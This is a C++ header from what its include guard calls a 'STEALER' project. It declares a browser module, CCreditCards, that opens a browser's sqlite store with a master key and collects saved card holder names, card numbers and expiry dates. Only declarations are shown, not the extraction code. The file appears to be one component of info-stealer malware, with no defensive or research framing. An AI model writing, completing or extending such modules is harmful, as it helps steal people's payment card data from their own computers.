//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_CCREDITCARDS_H
#define STEALER_CCREDITCARDS_H


#include "../../BrowserModule.h"
#include "sqlite3.h"

struct CreditCard {
    std::string name_on_card = "Unknown";
    std::string card_number = "Unknown";
    int expiration_month;
    int expiration_year;
    int use_count;
};

class CCreditCards : public BrowserModule {
public:
    void execute(const fs::path &root, const std::string &name, const fs::path &path) override;
private:
    static std::list<CreditCard> getCreditCards(const fs::path &db_path, const std::vector<BYTE> &master_key);
};


#endif //STEALER_CCREDITCARDS_H
